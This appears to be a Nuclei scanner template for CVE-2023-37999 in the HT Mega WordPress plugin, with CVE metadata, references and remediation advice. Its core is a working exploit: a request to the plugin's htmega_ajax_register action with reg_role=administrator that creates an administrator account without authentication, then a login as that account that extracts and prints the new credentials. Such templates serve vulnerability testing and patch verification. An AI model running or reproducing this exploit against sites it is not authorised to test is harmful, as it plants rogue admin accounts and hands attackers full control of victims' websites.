flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - contains(body,"Successfully Register")
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'POST /wp-admin/admin-ajax.php?action=htmega_ajax_register HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    reg_name={{username}}&reg_password={{password}}&reg_email={{email}}&reg_role=administrator

    '
- extractors:
  - dsl:
    - '"Username: " + username + ". Password: "+ password'
    type: dsl
  matchers:
  - condition: and
    dsl:
    - contains_all(header,"wordpress_logged_in", "/wp-admin")
    - status_code == 302
    type: dsl
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Login

    '
id: CVE-2023-37999
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:hasthemes:ht_mega:*:*:*:*:free:wordpress:*:*
    cve-id: CVE-2023-37999
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-269
    epss-percentile: 0.97794
    epss-score: 0.52072
  description: 'The HT Mega plugin for WordPress is vulnerable to Missing Authorization
    in versions up to, and including, 2.2.0. This is due to missing validation of
    the reg_role parameter on the htmega_ajax_register function. This makes it possible
    for unauthenticated attackers to create administrator accounts.

    '
  impact: 'Attackers can escalate privileges, gaining unauthorized access to restricted
    functionalities or data.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: ht_mega
    publicwww-query: /wp-content/plugins/ht-mega-for-elementor
    vendor: hasthemes
    verified: true
  name: "HT Mega \u2013 Absolute Addons for Elementor <= 2.2.0 - Missing Authorization\
    \ to Privilege Escalation"
  reference:
  - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/ht-mega-for-elementor/ht-mega-absolute-addons-for-elementor-220-missing-authorization-to-privilege-escalation
  - https://plugins.trac.wordpress.org/changeset/2934204/ht-mega-for-elementor/trunk/includes/helper-function.php?contextall=1&old=2899662&old_path=%2Fht-mega-for-elementor%2Ftrunk%2Fincludes%2Fhelper-function.php
  - https://patchstack.com/database/vulnerability/ht-mega-for-elementor/wordpress-ht-mega-absolute-addons-for-elementor-plugin-2-2-0-unauthenticated-privilege-escalation-vulnerability?_s_id=cve
  - https://nvd.nist.gov/vuln/detail/CVE-2023-37999
  remediation: 'Update to the latest version of HT Mega to address the privilege management
    issue.

    '
  severity: critical
  tags: cve,cve2023,wordpress,wp,wp-plugin,hasthemes,ht_mega,vkev,ht-mega-for-elementor
variables:
  email: '{{randstr}}@{{rand_base(5)}}.com'
  password: '{{rand_base(8)}}'
  username: '{{rand_base(6)}}'
